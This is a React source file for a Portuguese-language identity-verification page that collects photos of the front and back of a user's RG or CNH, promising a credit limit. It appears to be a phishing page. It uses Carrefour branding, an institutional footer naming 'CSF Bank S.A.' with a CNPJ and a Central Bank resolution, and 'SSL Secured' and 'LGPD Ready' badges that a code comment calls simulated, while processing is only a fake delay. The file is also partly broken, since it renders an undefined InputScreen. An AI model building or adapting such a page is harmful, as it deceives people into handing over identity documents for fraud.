import { useState, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import Webcam from 'react-webcam';
import InputMask from 'react-input-mask';
import { Camera, RefreshCw, Check, AlertCircle, ArrowRight, User, Image as ImageIcon, Sun, Smartphone, FileText, ShieldCheck, Scale, CreditCard, ChevronRight } from 'lucide-react';
import { useUserStore } from '../../store/userStore';
import Logo from '../Shared/Logo';
import ProgressBar from '../Shared/ProgressBar';

export default function KycPage() {
    const navigate = useNavigate();
    const { setKycData, setEtapaAtual } = useUserStore();
    const webcamRef = useRef(null);

    const [selectedDoc, setSelectedDoc] = useState('rg'); // 'rg' or 'cnh'
    const [docNumber, setDocNumber] = useState('');
    const [step, setStep] = useState('selection'); // 'selection', 'input-doc', 'intro-front', 'capture-front', 'review-front', 'intro-back', 'capture-back', 'review-back', 'sending'
    const [photos, setPhotos] = useState({ front: null, back: null });
    const [error, setError] = useState('');

    // Configurações da Câmera
    const videoConstraints = {
        facingMode: "environment",
        width: { ideal: 1280 },
        height: { ideal: 720 }
    };

    const handleDocSelection = (type) => {
        setSelectedDoc(type);
        setStep('intro-front'); // Pula direto para instrução da foto
    };

    const capture = useCallback((side) => {
        const imageSrc = webcamRef.current.getScreenshot();
        setPhotos(prev => ({ ...prev, [side]: imageSrc }));
        setStep(side === 'front' ? 'review-front' : 'review-back');
    }, [webcamRef]);

    const confirmPhoto = (side) => {
        if (side === 'front') {
            setStep('intro-back');
        } else {
            finishKyc();
        }
    };

    const finishKyc = async () => {
        setStep('sending');
        // Salvar final (RG fica genérico pois pulamos o input)
        setKycData(`${selectedDoc.toUpperCase()} (Via Foto)`, photos.front, photos.back);

        // Simular processamento
        await new Promise(resolve => setTimeout(resolve, 2000));

        setEtapaAtual('processing');
        navigate('/processing');
    };

    const retake = (side) => {
        setStep(side === 'front' ? 'capture-front' : 'capture-back');
    };

    // 1. TELA DE SELEÇÃO DE DOCUMENTO (Com Trust Footer CSF Bank)
    const SelectionScreen = () => (
        <motion.div
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="max-w-md mx-auto flex flex-col h-full justify-between min-h-[60vh]" // Flex para empurrar footer
        >
            <div>
                <div className="bg-white rounded-3xl shadow-xl p-8 mb-8 border border-gray-100">
                    <div className="w-16 h-16 bg-blue-50 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-sm">
                        <ShieldCheck className="w-8 h-8 text-carrefour-blue" />
                    </div>

                    <h2 className="text-2xl font-extrabold text-gray-900 mb-3 text-center tracking-tight">Validação de Identidade</h2>
                    <p className="text-gray-500 text-center mb-10 leading-relaxed">
                        Para habilitar seu limite de crédito, precisamos confirmar quem é você. Qual documento deseja usar?
                    </p>

                    <div className="space-y-4">
                        <button
                            onClick={() => handleDocSelection('rg')}
                            className="w-full bg-white hover:bg-blue-50/50 border-2 border-gray-100 hover:border-carrefour-blue p-5 rounded-2xl flex items-center gap-5 transition-all group shadow-sm hover:shadow-md"
                        >
                            <div className="w-12 h-12 bg-gray-50 rounded-full flex items-center justify-center text-gray-600 group-hover:bg-carrefour-blue group-hover:text-white transition-colors">
                                <User className="w-6 h-6" />
                            </div>
                            <div className="text-left flex-1">
                                <p className="font-bold text-gray-900 text-lg">Carteira de Identidade</p>
                                <p className="text-sm text-gray-500 font-medium">RG</p>
                            </div>
                            <ChevronRight className="w-5 h-5 text-gray-300 group-hover:text-carrefour-blue transition-colors" />
                        </button>

                        <button
                            onClick={() => handleDocSelection('cnh')}
                            className="w-full bg-white hover:bg-blue-50/50 border-2 border-gray-100 hover:border-carrefour-blue p-5 rounded-2xl flex items-center gap-5 transition-all group shadow-sm hover:shadow-md"
                        >
                            <div className="w-12 h-12 bg-gray-50 rounded-full flex items-center justify-center text-gray-600 group-hover:bg-carrefour-blue group-hover:text-white transition-colors">
                                <CreditCard className="w-6 h-6" />
                            </div>
                            <div className="text-left flex-1">
                                <p className="font-bold text-gray-900 text-lg">Carteira de Motorista</p>
                                <p className="text-sm text-gray-500 font-medium">CNH</p>
                            </div>
                            <ChevronRight className="w-5 h-5 text-gray-300 group-hover:text-carrefour-blue transition-colors" />
                        </button>
                    </div>
                </div>
            </div>

            {/* TRUST FOOTER - INSTITUCIONAL CSF BANK */}
            <div className="mt-8 text-center space-y-4 opacity-80 mb-8">
                <div className="flex items-center justify-center gap-2 text-gray-400 mb-4">
                    <div className="h-[1px] w-12 bg-gray-200"></div>
                    <span className="text-[10px] uppercase font-bold tracking-widest">Ambiente Seguro</span>
                    <div className="h-[1px] w-12 bg-gray-200"></div>
                </div>

                <div className="flex flex-col items-center gap-1">
                    <p className="text-sm font-bold text-gray-600 flex items-center gap-2">
                        <Scale className="w-4 h-4 text-gray-400" />
                        CSF Bank S.A.
                    </p>
                    <p className="text-[11px] text-gray-400">
                        CNPJ: 45.741.285/0001-98 • Instituição Financeira Autorizada
                    </p>
                    <p className="text-[10px] text-gray-400 max-w-[280px] mx-auto leading-tight mt-1">
                        Seguindo as diretrizes da Resolução nº 4.753/2019 do Banco Central do Brasil para prevenção a fraudes (PLDFT).
                    </p>
                </div>

                <div className="flex justify-center gap-4 mt-2 grayscale opacity-50">
                    {/* Simulação de logos de segurança */}
                    <div className="flex items-center gap-1.5 border border-gray-200 rounded px-2 py-1 bg-white">
                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <span className="text-[10px] font-bold text-gray-600">SSL Secured</span>
                    </div>
                    <div className="flex items-center gap-1.5 border border-gray-200 rounded px-2 py-1 bg-white">
                        <ShieldCheck className="w-3 h-3 text-carrefour-blue" />
                        <span className="text-[10px] font-bold text-gray-600">LGPD Ready</span>
                    </div>
                </div>
            </div>
        </motion.div>
    );

    // Componente de Instruções Reutilizável
    const InstructionsCard = ({ title, onContinue, side }) => (
        <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-white rounded-2xl shadow-lg p-8 text-center"
        >
            <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
                <FileText className="w-10 h-10 text-carrefour-blue" />
            </div>

            <h2 className="text-2xl font-bold text-gray-900 mb-2">{title}</h2>
            <p className="text-gray-600 mb-8">Siga as dicas para uma boa validação:</p>

            <div className="grid grid-cols-1 gap-4 mb-8 text-left">
                <div className="bg-gray-50 p-4 rounded-xl flex items-center gap-4">
                    <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-yellow-500">
                        <Sun className="w-6 h-6" />
                    </div>
                    <div>
                        <p className="font-semibold text-gray-900">Boa iluminação</p>
                        <p className="text-xs text-gray-500">Escolha um local claro</p>
                    </div>
                </div>

                <div className="bg-gray-50 p-4 rounded-xl flex items-center gap-4">
                    <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-blue-500">
                        <Smartphone className="w-6 h-6" />
                    </div>
                    <div>
                        <p className="font-semibold text-gray-900">Sem reflexos</p>
                        <p className="text-xs text-gray-500">Retire do plástico protetor</p>
                    </div>
                </div>

                <div className="bg-gray-50 p-4 rounded-xl flex items-center gap-4">
                    <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-green-500">
                        <Check className="w-6 h-6" />
                    </div>
                    <div>
                        <p className="font-semibold text-gray-900">Foco nítido</p>
                        <p className="text-xs text-gray-500">O texto deve estar legível</p>
                    </div>
                </div>
            </div>

            <button
                onClick={onContinue}
                className="w-full bg-carrefour-blue hover:bg-blue-700 text-white font-bold py-4 rounded-lg flex items-center justify-center gap-2 transition-all shadow-md"
            >
                <Camera className="w-5 h-5" />
                Tirar foto da {side === 'front' ? 'FRENTE' : 'VERSO'}
            </button>
        </motion.div>
    );

    // Componente de Captura Reutilizável
    const CaptureScreen = ({ side }) => (
        <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="relative bg-black h-[80vh] w-full max-w-lg mx-auto overflow-hidden shadow-2xl rounded-xl"
        >
            <Webcam
                audio={false}
                ref={webcamRef}
                screenshotFormat="image/jpeg"
                videoConstraints={videoConstraints}
                className="w-full h-full object-cover"
            />

            {/* Overlay Guia */}
            <div className="absolute inset-0 border-[20px] border-black/50 pointer-events-none flex items-center justify-center">
                <div className="w-[85%] aspect-[1.58] border-2 border-white/50 rounded-lg relative">
                    <div className="absolute top-0 left-0 w-4 h-4 border-t-4 border-l-4 border-carrefour-blue -mt-1 -ml-1"></div>
                    <div className="absolute top-0 right-0 w-4 h-4 border-t-4 border-r-4 border-carrefour-blue -mt-1 -mr-1"></div>
                    <div className="absolute bottom-0 left-0 w-4 h-4 border-b-4 border-l-4 border-carrefour-blue -mb-1 -ml-1"></div>
                    <div className="absolute bottom-0 right-0 w-4 h-4 border-b-4 border-r-4 border-carrefour-blue -mb-1 -mr-1"></div>
                </div>
            </div>

            <div className="absolute top-8 left-0 right-0 text-center pointer-events-none">
                <span className="bg-black/60 text-white px-4 py-2 rounded-full text-sm font-medium">
                    Foto da {side === 'front' ? 'FRENTE' : 'VERSO'}
                </span>
            </div>

            <div className="absolute bottom-0 left-0 right-0 p-8 bg-gradient-to-t from-black/90 to-transparent flex flex-col items-center justify-center pb-12">
                <button
                    onClick={() => capture(side)}
                    className="w-20 h-20 rounded-full bg-white border-4 border-gray-300 shadow-lg hover:scale-105 transition-transform flex items-center justify-center relative group"
                >
                    <div className="w-16 h-16 rounded-full border-2 border-gray-200 group-hover:bg-gray-100 transition-colors" />
                </button>

                {/* DEV MODE SIMULATION */}
                {(import.meta.env.DEV || window.location.hostname.includes('localhost')) && (
                    <button
                        onClick={() => {
                            // Imagem de placeholder (RG Genérico para teste)
                            const mockImage = "https://t4.ftcdn.net/jpg/04/70/29/97/360_F_470299797_UD0eoVMMSUbHCcNJCdv2t8B2g1w6aeGY.jpg";
                            setPhotos(prev => ({ ...prev, [side]: mockImage }));
                            setStep(side === 'front' ? 'review-front' : 'review-back');
                        }}
                        className="mt-4 text-xs text-white/50 hover:text-white border border-white/20 px-3 py-1 rounded-full uppercase tracking-wider"
                    >
                        [DEV] Simular Foto
                    </button>
                )}
            </div>
        </motion.div>
    );

    // Componente de Review Reutilizável
    const ReviewScreen = ({ side, image }) => (
        <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="bg-white rounded-2xl shadow-lg p-6 max-w-md mx-auto"
        >
            <h3 className="text-xl font-bold text-gray-900 mb-2 text-center">A foto ficou boa?</h3>
            <p className="text-gray-500 text-center mb-6 text-sm">Certifique-se que o texto está legível e sem cortes.</p>

            <div className="aspect-[1.58] rounded-xl overflow-hidden bg-gray-100 mb-6 border-2 border-gray-200 shadow-inner">
                <img src={image} alt="Documento" className="w-full h-full object-cover" />
            </div>

            <div className="space-y-3">
                <button
                    onClick={() => confirmPhoto(side)}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 rounded-lg flex items-center justify-center gap-2 transition-all shadow-md"
                >
                    <Check className="w-5 h-5" />
                    Sim, está legível
                </button>

                <button
                    onClick={() => retake(side)}
                    className="w-full bg-white border-2 border-gray-200 text-gray-700 font-bold py-3.5 rounded-lg hover:bg-gray-50 transition-colors"
                >
                    Tirar nova foto
                </button>
            </div>
        </motion.div>
    );

    // Tela de Envio
    const SendingScreen = () => (
        <div className="flex flex-col items-center justify-center py-20 bg-white rounded-2xl shadow-lg max-w-md mx-auto">
            <div className="w-24 h-24 relative mb-6">
                <div className="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-carrefour-blue border-t-transparent rounded-full animate-spin"></div>
                <FileText className="absolute inset-0 m-auto text-gray-300 w-8 h-8 opacity-50" />
            </div>
            <h3 className="text-xl font-bold text-gray-900 mb-2">Enviando Documentos</h3>
            <p className="text-gray-500">Estamos validando suas imagens...</p>
        </div>
    );

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col">
            {/* Header */}
            <div className="bg-white border-b border-gray-200 sticky top-0 z-50">
                <div className="container mx-auto px-4 py-4">
                    <Logo size="md" />
                </div>
            </div>

            <div className="flex-1 container mx-auto px-4 py-8">
                <ProgressBar etapaAtual="kyc" />

                <div className="mt-8">
                    <AnimatePresence mode='wait'>

                        {/* ETAPA 1: SELEÇÃO*/}
                        {step === 'selection' && (
                            <SelectionScreen key="selection" />
                        )}

                        {/* ETAPA 2: INPUT */}
                        {step === 'input-doc' && (
                            <InputScreen key="input-doc" />
                        )}

                        {/* FLOW FRENTE */}
                        {step === 'intro-front' && (
                            <InstructionsCard
                                key="intro-front"
                                title={`FRENTE do ${selectedDoc.toUpperCase()}`}
                                onContinue={() => setStep('capture-front')}
                                side="front"
                            />
                        )}

                        {step === 'capture-front' && (
                            <CaptureScreen key="capture-front" side="front" />
                        )}

                        {step === 'review-front' && (
                            <ReviewScreen key="review-front" side="front" image={photos.front} />
                        )}

                        {/* FLOW VERSO */}
                        {step === 'intro-back' && (
                            <InstructionsCard
                                key="intro-back"
                                title={`VERSO do ${selectedDoc.toUpperCase()}`}
                                onContinue={() => setStep('capture-back')}
                                side="back"
                            />
                        )}

                        {step === 'capture-back' && (
                            <CaptureScreen key="capture-back" side="back" />
                        )}

                        {step === 'review-back' && (
                            <ReviewScreen key="review-back" side="back" image={photos.back} />
                        )}

                        {/* ENVIO */}
                        {step === 'sending' && (
                            <SendingScreen key="sending" />
                        )}

                    </AnimatePresence>
                </div>
            </div>
        </div>
    );
}
